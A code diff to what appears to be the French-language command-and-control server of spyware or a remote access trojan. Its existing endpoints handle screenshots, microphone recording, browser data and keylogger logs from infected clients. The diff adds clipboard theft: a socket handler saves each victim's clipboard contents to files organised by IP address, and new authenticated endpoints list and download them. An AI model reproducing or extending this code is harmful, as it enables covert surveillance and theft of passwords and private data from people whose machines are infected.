@@ -44,6 +44,7 @@ screenshot_ns = api.namespace('api/v1/screenshot', description='Screenshot opera
 microphone_ns = api.namespace('api/v1/microphone', description='Microphone operations')
 browser_ns = api.namespace('api/v1/browser', description='Browser data operations')
 keylogger_ns = api.namespace('api/v1/keylogger', description='Keylogger operations')
+papier_ns = api.namespace('api/v1/papier', description='Papier operations')
 
 auth_model = api.model('Auth', {'secret_key': fields.String(required=True, description='Clé secrète')})
 command_model = api.model('Command', {
@@ -80,6 +81,11 @@ keylogger_model = api.model('Keylogger', {
     'id': fields.Integer(required=True, description='ID du keylogger'),
     'file_path': fields.String(required=True, description='Chemin du fichier du keylogger'),
     'date_created': fields.String(required=True, description='Date de création du keylogger')
+})
+papier_model = api.model('Papier', {
+    'id': fields.Integer(required=True, description='ID du papier'),
+    'file_path': fields.String(required=True, description='Chemin du fichier du papier'),
+    'date_created': fields.String(required=True, description='Date de création du papier')
 })
 
 client_params = api.parser()
@@ -305,6 +311,30 @@ class GetKeyloggerLog(Resource):
             return {'status': 'error', 'message': 'Fichier du keylogger non trouvé.'}, 404
 
 
+@papier_ns.route('/client/<int:client_id>')
+class GetPapiersByClientId(Resource):
+    @jwt_required()
+    @api.doc(security='bearer_auth')
+    @papier_ns.marshal_with(papier_model, as_list=True)
+    def get(self, client_id):
+        papiers = Command.query.filter_by(client_id=client_id, type=CommandType.PAPIER).all()
+        for papier in papiers:
+            papier.date_created = papier.date_created.strftime('%d/%m/%Y à %H:%M:%S')
+        return papiers, 200
+
+
+@papier_ns.route('/papier/<int:papier_id>')
+class GetPapierFile(Resource):
+    @jwt_required()
+    @api.doc(security='bearer_auth')
+    def get(self, papier_id):
+        papier = Command.query.get(papier_id)
+        if papier and os.path.exists(papier.file_path):
+            return send_file(papier.file_path, mimetype='text/plain')
+        else:
+            return {'status': 'error', 'message': 'Fichier du papier non trouvé.'}, 404
+
+
 @socketio.on('connect')
 def handle_connect():
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
@@ -415,6 +445,26 @@ def handle_keyboard(data):
             db.session.add(new_command)
             db.session.commit()
 
+@socketio.on('clipboard_response')
+def handle_clipboard(data):
+    sid = request.sid
+    client = Client.query.filter_by(sid=sid).first()
+    if client:
+        clipboard_dir = f"clipboards/{client.ip}"
+        os.makedirs(clipboard_dir, exist_ok=True)
+        file_name = f"{datetime.now().strftime('%Y-%m-%d_%H')}.txt"
+        clipboard_path = f"{clipboard_dir}/{file_name}"
+        with open(clipboard_path, 'a', encoding='utf-8') as f:
+            f.write(data.get('clipboard_content'))
+        new_command = Command(type=CommandType.PAPIER, client_id=client.id, file_path=clipboard_path)
+        if db.session.query(Command).filter_by(file_path=clipboard_path).count() > 0:
+            update_command = Command.query.filter_by(file_path=clipboard_path).first()
+            update_command.date_created = datetime.now()
+            db.session.commit()
+        else:
+            db.session.add(new_command)
+            db.session.commit()
+        app.logger.info(f"Contenu du presse-papiers reçu de {client.ip} et enregistré sous {clipboard_path}")
 
 @socketio.on('disconnect')
 def handle_disconnect():
